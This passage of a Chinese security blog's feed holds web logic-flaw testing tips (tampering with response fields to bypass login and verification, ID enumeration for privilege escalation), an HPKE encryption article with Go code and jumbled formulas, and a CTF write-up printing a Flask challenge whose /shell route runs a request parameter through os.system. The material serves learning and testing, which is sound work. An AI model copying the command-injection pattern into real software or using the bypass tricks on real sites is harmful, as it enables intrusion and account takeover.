https打头的连接都采用了SSL加密技术。在线购物、网银等活动均采用SSL技术来防止窃密及避免中间人攻击。</li></ol><p>该漏洞被归为缓冲过度读取。缓冲过度读取错误是软件可以读取比应该被允许还多的数据。漏洞让特定版本的openSSL成为无需钥匙即可开启的“废锁”，入侵者每次可以翻检户主的64K信息，只要有足够的耐心和时间，就可以翻检足够多的数据，拼凑出户主的银行密码、私信等敏感数据。产生原因：数据在传输的两端是不加密的。一些数据如果在传输过程中不加密则会泄露个人数据等信息。</p><ol><li>修改返回包的越权<ol><li>修改手机号</li></ol></li></ol><p>一般的逻辑为：认证原手机号-&gt; 填写新手机号-&gt; 提交修改</p><p>如果在下一步操作时，没有校验上一步的认证是否成功时，就会存在逻辑缺陷绕过</p><p>比如在进行第一步认证原手机号时，随意输入验证码，将response包中的相关字段进行修改，比如0改成1，false改成true，即可绕过第一步验证，进入填写新手机号界面，如果第三步提交修改时没有验证第一步的结果，就会造成逻辑漏洞</p><ol><li>登录绕过</li></ol><p>部分网站的身份验证放在了前端，因此只需要将response包中的相关字段进行修改，比如0改成1，false改成true，就可以登录任意用户账号</p><ol><li>水平越权<ol><li>遍历ID</li></ol></li></ol><p>在一些请求中，GET和POST中有明显的ID数字参数（手机号、员工号、账单号、银行卡号、订单号等等），可以尝试进行遍历，如果程序没有对当前权限进行判断，就会存在水平越权问题</p><ol><li>ID替换</li></ol><p>如果程序对用户标识进行了hash或者加密，而无法破解用的什么方式的话，就无法通过遍历ID来获取其它用户的信息了，此时可以尝试注册两个账号，通过替换两个ID加密后的值，判断程序是否对权限进行了验证，如果没有，也会存在越权问题</p><ol><li>垂直越权</li></ol><p>观察cookie中的session字段，可能某些字段或者参数代表身份，尝试修改</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> BugBounty </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebSec </tag>
            
            <tag> BugBounty </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>混合加密</title>
      <link href="/2024/11/13/2024-08-04-for-trust-performance/"/>
      <url>/2024/11/13/2024-08-04-for-trust-performance/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="在信任、性能和安全性方面，混合公钥加密是赢家"><a href="#在信任、性能和安全性方面，混合公钥加密是赢家" class="headerlink" title="在信任、性能和安全性方面，混合公钥加密是赢家"></a>在信任、性能和安全性方面，混合公钥加密是赢家</h1><p>我们喜欢公钥加密。它使我们能够安全地交换机密并对数据进行数字签名。但是，在实际加密大量数据时，它并不那么有效。</p><p>为此，Bob 将他的公钥发送给 Alice，她用它加密数据并发回密文。然后，Bob 使用关联的私钥对其进行解密。这对于少量数据（例如加密 128 位或 256 位加密密钥）相当有效，但在加密大量数据时，计算成本会变得很高。当我们使用移动设备时，这一点尤其重要，因为计算量的增加通常会耗尽电池电量。我们手头加密数据的核心方法是使用 RSA，但 RSA 通常是在移动设备上实施的重度方法。</p><p>那么，解决方案是什么？我们能否将对称密钥加密与公钥加密相结合？</p><h2 id="对称密钥加密与公钥加密相结合"><a href="#对称密钥加密与公钥加密相结合" class="headerlink" title="对称密钥加密与公钥加密相结合"></a>对称密钥加密与公钥加密相结合</h2><p>RFC 9180 提供了一种 HPKE（混合公钥加密）[<a href="https://www.rfc-editor.org/rfc/rfc9180.html">此处</a>]的解决方案：</p><p><a href="https://cdn-images-1.readmedium.com/v2/resize:fit:800/0*IzDACVGmBqiHcFCC.png" class="gallery-item"><img src="https://cdn-images-1.readmedium.com/v2/resize:fit:800/0*IzDACVGmBqiHcFCC.png"></a></p><p>这样，我们使用对称密钥来加密数据，然后使用公钥加密来加密对称密钥。我们还可以使用私钥对数据进行签名，并且可以使用关联的公钥进行检查。通过这种方式，我们还可以将身份验证集成到传输的数据中，并且可以正确验证数据的发送者（使用发送者的公钥）。</p><p>苹果也刚刚宣布，他们的CryptoKit现在将以Beta形式支持HPKE：</p><p><a href="https://cdn-images-1.readmedium.com/v2/resize:fit:800/0*ePpotlntVS7-dfzh.png" class="gallery-item"><img src="https://cdn-images-1.readmedium.com/v2/resize:fit:800/0*ePpotlntVS7-dfzh.png"></a></p><p>除了提供具有附加数据的经过身份验证的加密 （AEAD） 算法外，该库还支持<strong>密钥派生函数</strong> （KDF） 来创建共享密钥：</p><ul><li>HKDF_SHA256.<ul><li>它使用带有 SHA-256 的基于 HMAC 的密钥派生函数。</li></ul></li><li>HKDF_SHA384.<ul><li>这使用基于 HMAC 的密钥派生函数和 SHA-384。</li></ul></li><li>HKDF_SHA512.<ul><li>这使用带有 SHA-512 的基于 HMAC 的密钥派生函数。</li></ul></li></ul><p><strong>密钥封装机制</strong> （KEM） 用于传递共享密钥。为了提高效率，它使用 ECC（椭圆曲线加密）和曲线 25519 或 P256：</p><ul><li>Curve25519_HKDF_SHA256.<ul><li>这将使用带有 SHA-256 哈希的 X25519。</li></ul></li><li>P256_HKDF_SHA256.<ul><li>这使用带有 SHA-256 哈希的 P256 （secp256r1） 曲线。</li></ul></li><li>P384_HKDF_SHA384 .<ul><li>这使用带有 SHA-384 哈希的 NIST P384 曲线。</li></ul></li><li>P521_HKDF_SHA512.<ul><li>它使用带有 SHA-512 哈希的 NIST P521 曲线，并且具有最强的安全性。</li></ul></li></ul><p>对于对称密钥加密，有两种主要方法：具有 GCM 模式的 AES 和 ChaCha20&#x2F;Poly1305：</p><ul><li>AES_GCM_128.<ul><li>它使用具有计数器模式 （GCM） 的 128 位 AES。这是一种经过验证的 AES 快速加密模式，可将分组密码转换为流密码。</li></ul></li><li>AES_GCM_256.<ul><li>它使用具有伽罗瓦&#x2F;计数器模式 （GCM） 的 256 位 AES。</li></ul></li><li>chaChaPoly.<ul><li>它使用带有 Poly1305 MAC（消息验证码）的 ChaCha20 流密码。</li></ul></li></ul><h2 id="混合加密"><a href="#混合加密" class="headerlink" title="混合加密"></a>混合加密</h2><p>许多其他图书馆已开始采用 HPKE，包括 CIRCL 图书馆：</p><p><a href="https://asecuritysite.com/golang/go_hybrid">https://asecuritysite.com/golang/go_hybrid</a></p><p>通过ECC（椭圆曲线加密），我们有机会同时使用公钥加密的强大功能，以及对称密钥加密的速度和安全性。因此，我们慢慢转向加密的最佳实践，其中围绕以下方面有越来越多的共识：</p><ul><li>公钥加密曲线：P256、P384、P521、X25519和X448。</li><li>密钥派生 （HKDF） 的哈希方法：SHA256、SHA384 和 SHA512。</li><li>对称密钥：128 位 AES GCM 和 256 位 AES GCM。</li></ul><p>上述所有方法都与大多数系统兼容。<br>为此，Bob 和 Alice 将选择一条曲线来定义他们的密钥对，然后使用给定的哈希方法来派生加密密钥。这通常是通过HKDF（HMAC密钥派生函数）实现的。对于实际加密，我们可以使用对称密钥加密，因为这是最有效的，并且比公钥加密快得多。总体而言，有了这个，总体上倾向于使用AEAD（具有附加数据的身份验证加密）。典型的模式是 GCM。因此，让我们使用 Golang 构建一种混合加密方法。</p><p>现在，假设 Bob 将向 Alice 发送加密消息。然后，Alice 将生成一个密钥对（公钥和私钥）。然后，她将公钥发送给 Bob，然后他使用它来派生加密（$S$）的对称密钥。然后，他使用 $K$ 和 AES GCM 对消息进行加密。Bob 接收到密码（$C$）和值 $R$。然后，她可以从 $R$ 中派生出私钥 $S$。使用此密钥，她可以解密密文以派生明文消息。</p><p>在这种方法中，Alice 生成一个随机私钥（$d_A$），然后在椭圆曲线（$G$）上取一个点，然后确定她的公钥（$Q_A$）：</p><p>$QA&#x3D;dA×GQ_A &#x3D; d_A \times GQA​&#x3D;dA​×G$</p><p>因此，$G$ 和 $Q_A$ 是椭圆曲线上的点。然后，Alice 将 $Q_A$ 发送给 Bob。接下来，Bob 将生成：</p><p>$R&#x3D;r×GR &#x3D; r \times GR&#x3D;r×G S&#x3D;r×QAS &#x3D; r \times Q_AS&#x3D;r×QA​$</p><p>其中 $r$ 是 Bob 生成的随机数。然后，对称密钥（$S$）用于加密消息。</p><p>然后，Alice 将与 $R$ 一起接收加密消息。然后，她能够通过以下命令确定相同的加密密钥：</p><p>$S&#x3D;dA×RS &#x3D; d_A \times RS&#x3D;dA​×R$</p><p>即：<br>$S&#x3D;dA×(r×G)S$<br>$&#x3D; d_A \times (r \times G)S$<br>$&#x3D;dA​×(r×G) S$<br>$&#x3D;r×(dA×G)S$<br>$&#x3D; r \times (d_A \times G)S$<br>$&#x3D;r×(dA​×G) S$<br>$&#x3D;r×QAS$<br>$&#x3D; r \times Q_AS$<br>$&#x3D;r×QA​$<br><a href="https://cdn-images-1.readmedium.com/v2/resize:fit:800/0*so8g9sAGdwSJStUV.png" class="gallery-item"><img src="https://cdn-images-1.readmedium.com/v2/resize:fit:800/0*so8g9sAGdwSJStUV.png"></a></p><h2 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h2><p>示例运行是 [<a href="https://asecuritysite.com/golang/go_hybrid">here</a>[：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Public key type: HPKE_KEM_P256_HKDF_SHA256</span><br><span class="line"> Params kem_id: 16 kdf_id: 1 aead_id: 1</span><br><span class="line">Key exchange parameters:</span><br><span class="line"> Ciphersize:  65</span><br><span class="line"> EncapsulationSeedSize: 32</span><br><span class="line"> PrivateKeySize: 32</span><br><span class="line"> PublicKeySize:  65</span><br><span class="line"> SeedSize:  32</span><br><span class="line"> SharedKeySize:  32</span><br><span class="line">Cipher parameters:</span><br><span class="line"> Key Length: 16</span><br><span class="line">Key derivation function:</span><br><span class="line"> Extract size: 32</span><br><span class="line">Message: Testing 123</span><br><span class="line">Cipher: 74268e3f6f7bc6b21c5071c1a78c8154c6cf1be7f2b93370445026</span><br><span class="line">Decipher: Testing 123</span><br></pre></td></tr></table></figure><p>代码基于 [<a href="https://github.com/cloudflare/circl">here</a>]：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"> <span class="string">&quot;crypto/rand&quot;</span></span><br><span class="line"><span class="comment">// &quot;encoding/hex&quot;</span></span><br><span class="line"> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"> <span class="string">&quot;os&quot;</span></span><br><span class="line"> <span class="string">&quot;strconv&quot;</span></span><br><span class="line"> <span class="string">&quot;github.com/cloudflare/circl/hpke&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"> kemID := <span class="type">int</span>(hpke.KEM_P256_HKDF_SHA256)</span><br><span class="line"> kdfID := <span class="type">int</span>(hpke.KDF_HKDF_SHA256)</span><br><span class="line"> aeadID := <span class="type">int</span>(hpke.AEAD_AES128GCM)</span><br><span class="line"> msg := <span class="string">&quot;Hello&quot;</span></span><br><span class="line"> argCount := <span class="built_in">len</span>(os.Args[<span class="number">1</span>:])</span><br><span class="line"> <span class="keyword">if</span> argCount &gt; <span class="number">0</span> &#123;</span><br><span class="line">  msg = os.Args[<span class="number">1</span>]</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> argCount &gt; <span class="number">1</span> &#123;</span><br><span class="line">  kemID, _ = strconv.Atoi(os.Args[<span class="number">2</span>])</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> argCount &gt; <span class="number">2</span> &#123;</span><br><span class="line">  kdfID, _ = strconv.Atoi(os.Args[<span class="number">3</span>])</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> argCount &gt; <span class="number">3</span> &#123;</span><br><span class="line">  aeadID, _ = strconv.Atoi(os.Args[<span class="number">4</span>])</span><br><span class="line"> &#125;</span><br><span class="line"> suite := hpke.NewSuite(hpke.KEM(kemID), hpke.KDF(kdfID), hpke.AEAD(aeadID))</span><br><span class="line"> info := []<span class="type">byte</span>(<span class="string">&quot;Test&quot;</span>)</span><br><span class="line"> Bob_pub, Bob_private, _ := hpke.KEM(kemID).Scheme().GenerateKeyPair()</span><br><span class="line"> Bob, _ := suite.NewReceiver(Bob_private, info)</span><br><span class="line"> Alice, _ := suite.NewSender(Bob_pub, info)</span><br><span class="line"> enc, sealer, _ := Alice.Setup(rand.Reader)</span><br><span class="line"> Alice_msg := []<span class="type">byte</span>(msg)</span><br><span class="line"> aad := []<span class="type">byte</span>(<span class="string">&quot;Additional data&quot;</span>)</span><br><span class="line"> ct, _ := sealer.Seal(Alice_msg, aad)</span><br><span class="line"> opener, _ := Bob.Setup(enc)</span><br><span class="line"> Bob_msg, _ := opener.Open(ct, aad)</span><br><span class="line"> <span class="keyword">if</span> (kemID!=<span class="number">48</span>) &#123;fmt.Printf(<span class="string">&quot;Public key type:\t%s\n&quot;</span>, Bob_pub.Scheme().Name()) &#125;</span><br><span class="line"> fmt.Printf(<span class="string">&quot; Params\t%s\n&quot;</span>, suite.String())</span><br><span class="line"> fmt.Printf(<span class="string">&quot;\nKey exchange parameters:\n&quot;</span>)</span><br><span class="line"> fmt.Printf(<span class="string">&quot; Ciphersize:\t\t%d\n&quot;</span>, hpke.KEM(kemID).Scheme().CiphertextSize())</span><br><span class="line"> fmt.Printf(<span class="string">&quot; EncapsulationSeedSize:\t%d\n&quot;</span>, hpke.KEM(kemID).Scheme().EncapsulationSeedSize())</span><br><span class="line"> fmt.Printf(<span class="string">&quot; PrivateKeySize:\t%d\n&quot;</span>, hpke.KEM(kemID).Scheme().PrivateKeySize())</span><br><span class="line"> fmt.Printf(<span class="string">&quot; PublicKeySize:\t\t%d\n&quot;</span>, hpke.KEM(kemID).Scheme().PublicKeySize())</span><br><span class="line"> fmt.Printf(<span class="string">&quot; SeedSize:\t\t%d\n&quot;</span>, hpke.KEM(kemID).Scheme().SeedSize())</span><br><span class="line"> fmt.Printf(<span class="string">&quot; SharedKeySize:\t\t%d\n&quot;</span>, hpke.KEM(kemID).Scheme().SharedKeySize())</span><br><span class="line"> fmt.Printf(<span class="string">&quot;\nCipher parameters:\n&quot;</span>)</span><br><span class="line"> fmt.Printf(<span class="string">&quot; Key Length:\t%d\n&quot;</span>, hpke.AEAD(aeadID).KeySize())</span><br><span class="line"> fmt.Printf(<span class="string">&quot;\nKey derivation function:\n&quot;</span>)</span><br><span class="line"> fmt.Printf(<span class="string">&quot; Extract size:\t%d\n&quot;</span>, hpke.KDF(kdfID).ExtractSize())</span><br><span class="line"></span><br><span class="line"> fmt.Printf(<span class="string">&quot;\nMessage:\t%s\n&quot;</span>, Alice_msg)</span><br><span class="line"> <span class="comment">// fmt.Printf(&quot;Cipher:\t%x\n&quot;, hex.EncodeToString(ct))</span></span><br><span class="line"> fmt.Printf(<span class="string">&quot;Cipher:\t%x\n&quot;</span>, ct)</span><br><span class="line"> fmt.Printf(<span class="string">&quot;Decipher:\t%s\n&quot;</span>, Bob_msg)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>虽然 OpenSSL 提供了如此多的加密方法，但它可能会使应用程序容易受到使用传统方法的攻击。除此之外，RSA加密等方法对电池的影响很大。MD5 和 SHA-1 等传统哈希方法也会使应用程序受到攻击。因此，RFC 9180 提供了一种使用最佳安全性的方法，以及有效的方法。所以，去混合动力吧！</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 加密算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> 对称加密 </tag>
            
            <tag> 非对称加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>V&amp;N2020-公开赛CHECKIN</title>
      <link href="/2024/11/13/2024-08-03-CTF-2020%E5%85%AC%E5%BC%80%E8%B5%9BCHECKIN/"/>
      <url>/2024/11/13/2024-08-03-CTF-2020%E5%85%AC%E5%BC%80%E8%B5%9BCHECKIN/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>&#x3D;&#x3D;&#x3D;&#x3D;</p><h1 id="直接代码审计"><a href="#直接代码审计" class="headerlink" title="直接代码审计"></a>直接代码审计</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># @app.route(&#x27;/flag&#x27;)</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">#     ## want flag? naive!</span></span><br><span class="line"><span class="comment">#     # You will never find the thing you want:)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shell&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    os.system(<span class="string">&quot;rm -f flag.txt&quot;</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="walk-through"><a href="#walk-through" class="headerlink" title="walk through"></a>walk through</h2><ol><li>任意代码执行？</li><li>但是flag.txt被删除了</li><li>我拿到shell 是不是能hui复原flag.txt呢？</li></ol><h2 id="由于buuoj不能读取外网"><a href="#由于buuoj不能读取外网" class="headerlink" title="由于buuoj不能读取外网"></a>由于buuoj不能读取外网</h2><p>拿到一个linux lab</p><p><a href="/../assets/img/image-72.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-72.png" alt="alt text"></a></p><p>获取到不到交互式shell</p><p><a href="/../assets/img/image-73.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-73.png" alt="alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>easy的代码审计</title>
      <link href="/2024/11/13/2024-08-02-nssctf-%5BSWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B%5Djicao/"/>
      <url>/2024/11/13/2024-08-02-nssctf-%5BSWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B%5Djicao/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p><a href="/../assets/img/image-71.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-71.png" alt="alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Netsec </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-IClean-walkthrough</title>
      <link href="/2024/11/13/2024-08-02-hack-the-box-IClean/"/>
      <url>/2024/11/13/2024-08-02-hack-the-box-IClean/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="da63f880385c3ac423c066fed6c63143fa95941572239dccece38c786602241c">7e8ec9cd4c38bd473ca2a20166522c3145fd1c8b18a1721263762d0215eb3f1a9e2f6583f81442cc48e4401935055f45e980a558d96e301c1d2cf7e701baaff41d92c08432e7b27405813252b7fa63f42d6601b18680ec8cb8c3cdde5eeac9cc1fab36494d3e026ad10b3dbf2435f3a644f0d10579b32e61ac09e2b0bbf3e8b9c3415bec1ef5e0d7b76ec542d8f30fa55b95ab194bbf2fad607064f7a5529ae6fd6e06a86504be6e6d2e7782191f259699c2d6ef5e789525c7bdb6840d28002422a605072c100a61c27dfa8f7727c65764b5b732bd778e8291acf59fcef28a8fe1c25c3623c846c873ec2dd02fe86efd9256d53f820cb8be84e0ab1ef9cf60c2f4cb4f2663e452772b027c0692ac84e6cebcfab2bde462489ed5d2619c910a81b6261f7d2bf2eace52c0337d8940d7ec63b77ac31286e7d613f219f87c0c1e86ded73a9a0c20374a3728cbb169985b8070d02bd5ca6a949366793fdecacfb6e3f3ae95fae5f5639dd65bfabc63e1851ac3d6d477fbe1b2e9e79e7c0aafc10505212bdec60f9a4191a3fa445ded1128f7c98822059acfe6b2fefc68b43c5e6ba261261e0da75560ce68caae9a9028b4426d5253103971c0af226143ffae984ad74ac45e68d6d9d9e5b1972d67b34cb892e784c5d027fb17698f2f2725afe3cc1c8599a85ddbea1245b6ae1cec037af5fa0a62d4c7d5e1359028a6d72a960acf993122748969fbd84e563c0cb338d13968d830a4bbef5be6311ed3bd229f1f5a0ebb12cdc139dac002039fa9b39f54e965cdb996ee33f48781d9ff1f585d3180be28503746b0b3c26c751ed7b7cbb9fb72cfb2f8f0034695204066b41b6b85fe09daf36cc2c4e568f91e938f586dd134ce83c2ab9a19f65f5d93291fd2c1606af37d4e26cf3e13103b75c969d0d532237aed761ba1b29bb2a997a7d019e00d3c02b763fe4a887a9c27ec4d3ba46d97534da8a04848a2adb1a9f0c9309c330abcf9d2dd4badea4d462e87f6e3fa84ebfeed19eea3d0166eb21d8ed54c60258ca669853a77f62fa8e4de3ba6791545c8d1f4bd7811f2929ca589cc82e8f7f976a502f727a3eefddb0a4844a3a0a616e41983c77178c9de37356ac35f8356b66cde9e2bc81e66b0b0e9a63187bde42f4d90d4f92d372e27619492cbf04859bf2f7a6802449feb7379a00ecfd373c406217cedd89d21374b55f881d7204e6024cffafeb2739f5da727a729ee088e80a1dacaa9aa5ce021071145fd153cb72f34c4cbb30c74c17de7d4f02e5e4deb73758604db2e796534e3ade20ee050147cef7893085b6083e15585fa1dd8f04eb39d1a471308c8e2524f4e3d221a827bdc84b8b1f53c1c9123c39fcdcd954f5eeccc32ab4646a58fd20ea051955ee9662b21313fc9a5d09af5a67da617b9eb36f07d8e99948cb0164c13bc7693d7320f2790b082f909b5de7bbfa919c3d3176d551fc70a38c57cc66a44e678a5ac503f57db3cf126e645358422f591ef224cc66804909a2822f791b121d2867d1e5762bf50b6a4049378d06a4ffe49a923bd9498c4d4e528c51af4376c3132546cb808ddb089e2d0611c29a8ef5aed097341e8f6cc41b364def64838163c0bb65a5fea6002c70645ac01e143a74665979638ef5a684b45b65456b93ce9951ca296d3f02bb685f2437dc7474e0d4373b02bac20955ac31b1493216da7ce78ca7ad9c56c0af06568a9a4e7a8be025854f2e85aa328dc6dbe6a7fca324dcf8bbcdaa3998707d9ed1b240be77213cc804a0300791ef5ed9638105879ddda5b60cc8b350d01bad0b5a6b1d423043b2cf96f57cdeae7d77141191e217ff094097ef39d4306d8d52b62d7519b32b0a9dba5c5fc88adab2ef8fb36ce2c5511e58c773933e7de86295c1150c23a5eb4b6976a42e91486aecedddc2b15e6624ea54ee1e64fc51c6862a8e73033430c3ce938f66a1f56f17ff4585b25954bb195a0c02ac1ef1e23747302e3240a6672c283302e0b44236ee05b20055939a62a9b877202f578f5ec3ae93453b80d58029f8d0caf8c1a32b47328d2cb96afc19dfd3a86d880afcc090845c2135dfe7b4330bd91f6d8be0b9642a7a3eff3960fae3c949ae5bc6c0447b2c7faf4e11adc1741ce8b6b243e49a69084c1fcfa915b7f4db97b1cb1ac20423676cf20db0a25b5c34ee62ebd880d48b241b94a0515eb84bc07caa8d84dbd829127656c821ec62f2a477f15a4c7d943235408d7d56b2d8d9b320d551932d9eeb450fdb095aaa4d72b541d21480ac78f8c45d232fb0d62eef9f715dbf69fbcf6084b6768588c1e49eccbccce324030c7316164f133f94b5a634c3cee6fd7928e591ddcf598714eefeb7bc6d2829fbdc8e76f16c19db497d6e51c3713cbec834f89b0fe4978204376226880cafb91acf5c805346f5b7ada129a5c412a6dccc5745a74023837345c2d910fd4db27a935d0bed97d3cab7c6e783cb48eaa54aac3863c6d64e55ee009b7b271d4653aae3dd4ec3a3dcffa2d0dd8a06ece1f5e9d48dd9fbc9fa78557efec749c7b3e4a28ac6099d63e0ed0e9f2fe38c45d6c5478f2dd8ffb60cb634a4dbe3120beae506b76d744dd81d383d0109ab284dd3fd74688ef2753e58bd54a03eb716e2f75aa4bea44a193612bc7a9d57288b6b3ce2e1c0abc04cdadf7be282d23653fa36f9a6bc766b10b851439229808d938608631de9e6c7715fda3e01d75ea9fb95f7c53d134ffe73f8a99770f7da88641ce23cc9ab11fff0f7758c18f181bfc9ff4b115795a1526da3f30c7cb5e3d6de969eb9d91d0bf6e62407dde51c7298ed727008e9b85445d42c5b9ebd07018316f5e71ad9067884d16adfa5f381d71ed30990d18660fdbb4fd1c51fdd99f433370af8e9bdeba49e3afc5c82e5f427ba1072f293accffa83010be05ac1bbcbcadffce0aea84aa7ed952f6537cf391720f93c0905873461d8e97b448344ae9c1bb96e4530dfd7d30728ed2b7d05b5a7bc4c7a17f263370765910fb0ff2cb22e1e41ca36f88320f177420d811927099f34f1ad90a9d40e249b28d6f3a8c7eb4d90c52a12a7c78a19c695ee7735edcc8197abb5d617e7b9596eaa1000d0572f2f25be34053d3c24991340bb3ca0fa6fa1144a7b23147d09b3f389453ba5b8c027f440bb25fc9a1b41ca442225d4241d2dbbe1cd0a3d8dbdf81a7a6fa816050a32825534071062693571941f9dd66717356c4eeb31bac83c